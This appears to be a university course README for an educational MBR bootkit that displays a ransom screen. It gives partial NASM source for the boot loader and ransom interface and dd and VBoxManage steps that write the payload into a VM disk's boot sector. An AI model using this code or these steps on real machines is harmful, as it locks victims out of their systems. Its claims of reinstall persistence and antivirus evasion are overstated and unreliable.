# Bootkit-Development-MBR-Infection-and-Ransomware-Simulation


> **Advanced x86 Assembly Language Project - Educational Cybersecurity Research**

<div align="center">

[![Assembly](https://img.shields.io/badge/Assembly-x86_16bit-red.svg)](https://en.wikipedia.org/wiki/X86_assembly_language)
[![NASM](https://img.shields.io/badge/Assembler-NASM-blue.svg)](https://www.nasm.us/)
[![Platform](https://img.shields.io/badge/Platform-BIOS/Legacy-yellow.svg)](#)
[![VirtualBox](https://img.shields.io/badge/Testing-VirtualBox-orange.svg)](https://www.virtualbox.org/)
[![Educational](https://img.shields.io/badge/Purpose-Educational-green.svg)](#)
[![Bootkit](https://img.shields.io/badge/Type-MBR_Bootkit-darkred.svg)](#)

*A sophisticated proof-of-concept demonstrating Master Boot Record infection techniques and low-level system control*

</div>

---

## 🎯 Project Overview

This project demonstrates the creation of a **sophisticated ransomware-style bootkit** implemented entirely in **16-bit x86 Assembly Language** using **NASM**. The bootkit operates at the **BIOS level**, intercepting the boot process before any operating system loads, showcasing advanced low-level programming and cybersecurity concepts.

### 🔥 Key Highlights

- **🎭 Master Boot Record Hijacking** - Complete MBR infection and replacement
- **⚡ Two-Stage Bootloader Architecture** - Modular design with Stage1 (MBR) and Stage2 (Payload)
- **🖥️ Real-Mode x86 Programming** - Direct BIOS interrupt manipulation
- **🎨 Custom Ransomware UI** - ASCII-based ransom note interface
- **🔐 Interactive Authentication** - Keyboard input handling and validation
- **💾 Raw Disk Manipulation** - Direct sector-level read/write operations
- **🛡️ System-Level Persistence** - Survives OS reinstallation attempts

---

## 🏗️ Technical Architecture

### System Design Overview

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│     BIOS        │    │   Stage1 (MBR)  │    │   Stage2        │
│   POST & Boot   │───▶│   512 bytes     │───▶│   Payload       │
│   Sequence      │    │   @ 0x7C00      │    │   @ 0x8000      │
└─────────────────┘    └─────────────────┘    └─────────────────┘
                              │                        │
                              ▼                        ▼
                    ┌─────────────────┐    ┌─────────────────┐
                    │   Disk I/O      │    │   Ransom UI     │
                    │   INT 0x13      │    │   INT 0x10/16   │
                    └─────────────────┘    └─────────────────┘
```

### Disk Layout Structure

| Sector | Size | Content | Purpose |
|--------|------|---------|---------|
| **LBA 0** | 512 bytes | **Stage1 MBR** | Boot hijacking + Stage2 loader |
| **LBA 1** | 512 bytes | **Reserved** | Gap/padding sector |
| **LBA 2-5** | 2048 bytes | **Stage2 Payload** | Ransomware UI + logic |

---

## 💻 Technology Stack

### Core Development Tools

- **🔧 [NASM](https://www.nasm.us/)** - Netwide Assembler for raw binary compilation
- **🖥️ [VirtualBox](https://www.virtualbox.org/)** - Safe virtualization environment for testing  
- **⚙️ [VBoxManage](https://www.virtualbox.org/manual/ch08.html)** - Command-line VM and disk management
- **🔨 [dd Utility](https://www.gnu.org/software/coreutils/manual/html_node/dd-invocation.html)** - Low-level disk image manipulation
- **🔍 [HxD](https://mh-nexus.de/en/hxd/)/[xxd](https://linux.die.net/man/1/xxd)** - Hex editors for binary analysis and verification
- **💿 [Windows 7 ISO](https://archive.org/details/Windows7-iso)** - Base OS image for infection testing

### Programming Environment

```assembly
[ORG 0x7C00]        ; MBR load address
[BITS 16]           ; 16-bit real mode
```

- **x86 Real Mode** - Direct hardware access, 1MB memory limit
- **BIOS Interrupts** - INT 0x10 (Video), INT 0x13 (Disk), INT 0x16 (Keyboard)
- **Raw Binary Output** - No OS dependencies or runtime libraries

---

## 🚀 Implementation Details

### Stage 1: MBR Hijacking (512 bytes)

**Core Responsibilities:**
- **System Initialization** - Set up segment registers and stack
- **Threat Display** - Show "MBR INFECTED!" warning message
- **Stage2 Loading** - Read 4 sectors from LBA 2-5 into memory
- **Control Transfer** - Jump to Stage2 payload at 0x8000

```assembly
; Critical MBR components
start:
    cli                    ; Disable interrupts
    xor ax, ax            ; Clear segments
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00        ; Set stack pointer
    
    ; Display infection message
    mov si, infection_msg
    call print_string
    
    ; Load Stage2 (4 sectors from LBA 2)
    mov ah, 0x02          ; BIOS read sectors
    mov al, 4             ; Sector count
    mov ch, 0             ; Cylinder
    mov cl, 3             ; Start sector (LBA 2)
    mov dh, 0             ; Head
    mov dl, [boot_drive]  ; Drive number
    mov bx, 0x8000        ; Load address
    int 0x13              ; Execute disk read
    
    jmp 0:0x8000          ; Transfer control to Stage2
```

### Stage 2: Ransomware Interface (2048 bytes)

**Advanced Features:**
- **Screen Management** - Clear screen and set video modes
- **UI Rendering** - Draw sophisticated ransom note layout
- **Input Handling** - Process keyboard input with validation
- **Authentication** - Verify against hardcoded key ("COAL")
- **Response Logic** - Handle correct/incorrect key scenarios

```assembly
; Ransomware UI core logic
display_ransom_screen:
    ; Set 80x25 text mode
    mov ax, 0x0003
    int 0x10
    
    ; Clear screen with scroll
    mov ax, 0x0600
    mov bh, 0x07          ; White on black
    xor cx, cx            ; Top-left (0,0)
    mov dx, 0x184F        ; Bottom-right (24,79)
    int 0x10
    
    ; Display ransom messages
    call draw_warning_header
    call display_payment_info
    call show_input_prompt
    
input_loop:
    xor ah, ah
    int 0x16              ; Wait for keystroke
    
    ; Process input and validate against secret key
    call process_keystroke
    cmp byte [input_complete], 1
    jne input_loop
    
    call validate_key
    ; Handle unlock/denial logic
```

---

## 🛠️ Development Workflow

### Note: You will need to make adjustments to the commands according to your specific paths.

### Phase 1: Environment Preparation

**Prerequisites Setup:**
```bash
# Ensure Windows 7 VM is properly configured
# Take clean snapshot before any modifications
# Install NASM assembler and required tools
```

**⚠️ Critical Prerequisite**: Learn Windows 7 VM setup from YouTube tutorials and create a **Clean Snapshot** before proceeding.

### Phase 2: Assembly & Compilation

```bash
# Step 1: Create raw disk image from Windows 7 VDI
VBoxManage clonehd "C:\Users\SIA\VirtualBox VMs\Windows 7\Windows 7.vdi" "C:\Users\SIA\clean.raw" --format RAW

# Step 2: cd Path -- compile assembly source to binary
nasm -f bin stage1.asm -o stage1.bin    # Must be exactly 512 bytes
nasm -f bin stage2.asm -o stage2.bin    # Must be exactly 2048 bytes

# Verify binary sizes via file properties
# stage1.bin: 512 bytes (MBR size)
# stage2.bin: 2048 bytes (4 sectors)
```

### Phase 3: Disk Infection Process

```bash
# Step 3: Inject bootkit into disk image
# Write Stage1 to MBR (LBA 0)
dd if=/c/stage1/stage1.bin of=/c/Users/SIA/clean.raw bs=512 seek=0 conv=notrunc

# Write Stage2 to sectors 2-5 (LBA 2-5)
dd if=/c/stage2/stage2.bin of=/c/Users/SIA/clean.raw bs=512 seek=2 conv=notrunc
```

### Phase 4: Verification & Analysis (Skip this step if you want the workflow in one go)

```bash
# Step 4: Verify injection with hex analysis
# View MBR content (Stage1)
xxd -s $((0*512)) -l 512 /c/Users/SIA/clean.raw

# View Stage2 payload (LBA 2-5)
xxd -s $((2*512)) -l $((4*512)) /c/Users/SIA/clean.raw

# ⚠️ WARNING: Hex editing can corrupt your .raw file
# Always work on copies and revert to Step 1 if needed
```

### Phase 5: Deployment & Testing

```bash
# Step 5: Convert infected raw image to VDI
VBoxManage convertfromraw "C:\Users\SIA\clean.raw" "C:\Users\SIA\clean.vdi" --format VDI

# Step 6: Deploy infected disk to VM
VBoxManage storageattach "Windows 7" --storagectl "SATA" --port 0 --device 0 --medium none
VBoxManage storageattach "Windows 7" --storagectl "SATA" --port 0 --device 0 --type hdd --medium "C:\Users\SIA\clean.vdi"

# Launch infected VM
VBoxManage startvm "Windows 7"
```

---

## 🧪 Testing & Validation

### Expected Boot Sequence

1. **BIOS Initialization** - System performs POST
2. **MBR Execution** - Stage1 displays "MBR INFECTED!" message
3. **Stage2 Loading** - Automatic transition to ransomware interface
4. **Ransom Screen** - ASCII-based UI with payment demands
5. **Key Validation** - Interactive input processing

### Authentication Testing

- **Secret Key**: `COAL` (hardcoded in Stage2)
- **Correct Input**: System displays "unlock" message but **remains locked**
- **Incorrect Input**: System shows error and remains in input loop
- **Important Note**: Even with correct key, Windows won't boot - **don't trust hackers!**

### Recovery & Cleanup

```bash
# Step 8: Complete environment reset (if needed)
VBoxManage closemedium disk "C:\Users\SIA\clean.raw" --delete
VBoxManage closemedium disk "C:\Users\SIA\clean.vdi" --delete
del "C:\Users\SIA\clean.raw"
del "C:\Users\SIA\clean.vdi"

# Revert to Step 2 and rebuild from clean snapshot
```

---

## 🔬 Technical Deep Dive

### BIOS Interrupt Usage

| Interrupt | Function | Purpose |
|-----------|----------|---------|
| **INT 0x10** | Video Services | Screen clearing, text output, cursor control |
| **INT 0x13** | Disk Services | Sector reading, MBR manipulation |
| **INT 0x16** | Keyboard Services | Keystroke input, character processing |

### Memory Layout

```
0x0000:0x7C00    <- Stage1 MBR code execution
0x0000:0x8000    <- Stage2 payload loading address
0x0000:0x7E00    <- Stack pointer location
```

### Assembly Programming Techniques

- **Segment Register Management** - Proper DS, ES, SS initialization
- **String Operations** - LODSB for efficient text processing  
- **Conditional Jumps** - Input validation and flow control
- **BIOS Service Calls** - Direct hardware interface programming
- **Memory Addressing** - Real-mode 20-bit address calculation

---

## 🎓 Educational Objectives

### Learning Outcomes

- **🔧 Low-Level Programming** - Direct hardware manipulation without OS abstraction
- **💾 Boot Process Understanding** - BIOS initialization and MBR execution flow
- **🛡️ Cybersecurity Awareness** - Understanding bootkit attack vectors and persistence
- **⚙️ Assembly Language Mastery** - Advanced x86 real-mode programming techniques
- **🔍 Reverse Engineering** - Analysis of boot-level malware behavior
- **🖥️ System Architecture** - Deep understanding of PC boot sequence

### Cybersecurity Insights

- **Persistence Mechanisms** - How malware survives OS reinstallation
- **Detection Evasion** - Operating below antivirus software visibility
- **Boot Security** - Importance of Secure Boot and TPM protection
- **Legacy Vulnerabilities** - Risks of BIOS/MBR-based boot systems

---

## ⚠️ Security & Ethics

### Educational Use Only

This project is developed **strictly for educational purposes** in cybersecurity research and assembly language instruction. Key ethical considerations:

- **🔒 Controlled Environment** - All testing performed in isolated VMs
- **📚 Academic Purpose** - Designed for learning, not malicious deployment
- **🚫 No Real Harm** - No actual file encryption or data destruction
- **⚖️ Legal Compliance** - Must be used within legal and institutional guidelines

### Important Security Notes

- **VM Isolation** - Never test on production systems or physical hardware
- **Snapshot Management** - Always maintain clean system snapshots
- **Legal Awareness** - Unauthorized deployment constitutes computer tampering
- **Responsible Disclosure** - Code shared for defensive education only

---

## 🏆 Project Achievements

### Technical Accomplishments

- ✅ **Complete MBR Infection** - Successful boot sequence hijacking
- ✅ **Two-Stage Architecture** - Modular bootkit design implementation  
- ✅ **Real-Mode Programming** - Advanced 16-bit x86 assembly mastery
- ✅ **BIOS Integration** - Direct hardware interrupt utilization
- ✅ **Interactive Interface** - Keyboard input processing and validation
- ✅ **Persistence Demonstration** - Boot-level malware simulation

### Educational Impact



- **Assembly Language Proficiency** - Practical low-level programming experience
- **System Security Understanding** - Boot-level attack vector comprehension
- **Reverse Engineering Skills** - Malware analysis technique development
- **Cybersecurity Awareness** - Defense strategy importance recognition

---

## 🚀 Future Enhancements

### Potential Improvements

- **🐧 UEFI Compatibility** - Modern firmware bootkit techniques
- **🔐 Advanced Encryption** - Actual file system encryption simulation
- **🌐 Network Communication** - C&C server interaction capabilities
- **🤖 Anti-Analysis Features** - VM detection and evasion techniques
- **📱 Multi-Platform Support** - Cross-architecture bootkit development

### Research Directions

- **Secure Boot Bypass** - UEFI security mechanism analysis
- **Firmware Rootkits** - BIOS/UEFI persistent infection techniques  
- **Detection Mechanisms** - Boot integrity monitoring solutions
- **Recovery Procedures** - Bootkit removal and system restoration

---

## 📚 Resources & References

### Technical Documentation
- **Intel x86 Architecture Manual** - Complete instruction set reference
- **BIOS Interrupt Reference** - Comprehensive service call documentation
- **NASM Manual** - Assembler syntax and usage guide
- **VirtualBox Documentation** - VM management and disk handling

### Educational Materials
- **Assembly Language Tutorials** - Step-by-step programming guides
- **Bootkit Analysis Papers** - Academic research on boot-level malware
- **Cybersecurity Courses** - Formal education in system security
- **Reverse Engineering Resources** - Malware analysis methodologies

---

## 📄 License & Disclaimer

This project is released under **Educational Use License** with the following terms:

- **Educational Purpose Only** - Not for commercial or malicious use
- **No Warranty** - Provided as-is for learning purposes
- **Legal Compliance** - Users responsible for local law adherence
- **Ethical Use** - Must follow responsible disclosure principles

**⚠️ CRITICAL WARNING**: This software demonstrates malware techniques for educational purposes only. Unauthorized use against systems you do not own is illegal and unethical. Always obtain proper authorization before testing security tools.

---

<div align="center">

**🎓 Developed for Computer Organization and Assembly Language Course**

*Advancing cybersecurity education through hands-on technical research*

[![University](https://img.shields.io/badge/Institution-University_of_Wah-blue.svg)](#)
[![Department](https://img.shields.io/badge/Department-Cybersecurity-purple.svg)](#)
[![Course](https://img.shields.io/badge/Course-Assembly_Language-teal.svg)](#)
[![Semester](https://img.shields.io/badge/Semester-4th-green.svg)](#)
[![Project](https://img.shields.io/badge/Type-Research_Project-orange.svg)](#)

---

**"Poke around and find out!"** 

**⭐ Star this repository if it helped your cybersecurity learning journey!**

</div>

